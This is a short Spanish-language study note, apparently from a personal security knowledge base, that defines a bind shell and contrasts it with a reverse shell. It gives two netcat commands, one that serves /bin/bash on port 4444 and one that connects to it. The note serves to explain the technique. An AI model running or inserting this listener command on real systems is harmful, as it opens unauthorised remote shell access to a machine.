-------------
- Tags: #tecnica #remoto #explotacion
----------------------------
# Definición

> Esta técnica es lo opuesto de la [[Reverse Shell]], ya que en lugar de que la máquina comprometida se conecte a la máquina del atacante, es el atacante quine se conecta a la máquina comprometida. El atacante escucha en un puerto determinado y la máquina comprometida acepta la conexión entrante en ese puerto. El atacante luego tiene acceso por consola a la máquina comprometida, lo que le permite tomar el control de la misma.

> Siendo esta la conexión más común para Shell TCP. El usuario el cual proporciona la [[shell]], espera una conexión en un puerto en específico. Cuando un cliente se conecta a este puerto, se entabla una comunicación, en la cual todo lo que envía el usuario se considera un comando que se inserta en la [[shell]] del usuario.

![[Pasted image 20230826115204.png]]

> Para realizar una **`bind shell`** usaremos [[Netcat]], con los siguientes comandos:

## Comandos

**Máquina usuario**
```bash
nc -lvp 4444 -e /bin/bash
```

**Máquina cliente**
```bash
nc IP-MAQUINA USUARIO 4444
```
